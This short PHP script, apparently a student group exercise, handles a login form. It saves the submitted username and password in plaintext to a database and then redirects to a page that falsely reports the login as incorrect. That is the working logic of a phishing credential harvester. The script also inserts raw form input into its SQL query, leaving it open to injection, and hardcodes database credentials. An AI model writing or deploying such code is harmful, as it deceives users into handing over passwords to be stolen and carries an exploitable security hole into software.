<?php
	session_start();
	$usu = $_POST["usuario"];
	$clav = $_POST["clave"];
	$msqli = new mysqli("localhost","2022_grupo1","Grupo1_2090","2022_grupo1");
	$sql = "insert into datos(dat_nombre,dat_clave) VALUES('$usu','$clav')";
	$msqli->query($sql);
	$msqli->close();
	header("location:http://fcytpa.uader.edu.ar:9494/periodo/2022/grupo5/htdocs/resultado.php?mensaje=Usuario o contraseña incorrecto");
?>